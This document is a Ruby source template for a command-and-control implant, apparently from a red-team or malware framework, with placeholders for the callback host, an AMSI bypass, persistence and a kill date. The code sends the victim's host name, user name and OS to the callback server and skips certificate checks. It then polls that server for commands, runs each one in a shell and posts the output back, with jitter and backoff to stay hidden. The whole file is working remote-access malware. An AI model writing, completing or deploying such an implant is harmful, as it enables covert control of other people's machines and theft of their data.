#!/usr/bin/env ruby
# IB Agent — Ruby
require 'net/http'
require 'json'
require 'uri'
require 'openssl'
require 'open3'
require 'date'
require 'socket'

CB = "[CALLBACK]"
FREQ = [FREQ]
JITTER = [JITTER]
RETRY_MAX = [RETRY_MAX]
LABEL = "[LABEL]"
[PROXY_SETUP]
[AMSI_BYPASS]
def http_post(url, data, ct = "application/json")
  uri = URI.parse(url)
  http = Net::HTTP.new(uri.host, uri.port)
  if uri.scheme == "https"
    http.use_ssl = true
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE
  end
  req = Net::HTTP::Post.new(uri.request_uri)
  req["Content-Type"] = ct
  req.body = data
  http.request(req)
end

def http_get(url)
  uri = URI.parse(url)
  http = Net::HTTP.new(uri.host, uri.port)
  if uri.scheme == "https"
    http.use_ssl = true
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE
  end
  http.request(Net::HTTP::Get.new(uri.request_uri))
end

hname = Socket.gethostname rescue "unknown"
uname = ENV["USER"] || ENV["USERNAME"] || "unknown"
os_info = "#{RUBY_PLATFORM} #{RbConfig::CONFIG['host_os'] rescue ''}"

checkin = { hostname: hname, username: uname, os_info: os_info, script: LABEL }.to_json
resp = http_post("#{CB}/agent/checkin", checkin)
result = JSON.parse(resp.body)
agent_id = result["agent_id"]
exit unless agent_id && !agent_id.empty?
[PERSIST_CODE]
_backoff = 1
loop do
  [KILLDATE_CHECK]
  begin
    r = http_get("#{CB}/agent/cmd/#{agent_id}")
    if r.code.to_i == 200
      _backoff = 1
      d = JSON.parse(r.body)
      cmd_id = d["id"]
      command = d["command"]
      output, _status = Open3.capture2e(command)
      http_post("#{CB}/agent/res/#{cmd_id}", output, "text/plain")
    else
      _backoff += 1 if RETRY_MAX > 1 && _backoff < RETRY_MAX
    end
  rescue
    _backoff += 1 if RETRY_MAX > 1 && _backoff < RETRY_MAX
  end
  s = FREQ * _backoff
  s *= (1 + (rand * 2 - 1) * JITTER / 100.0) if JITTER > 0
  sleep [s, 1].max
end
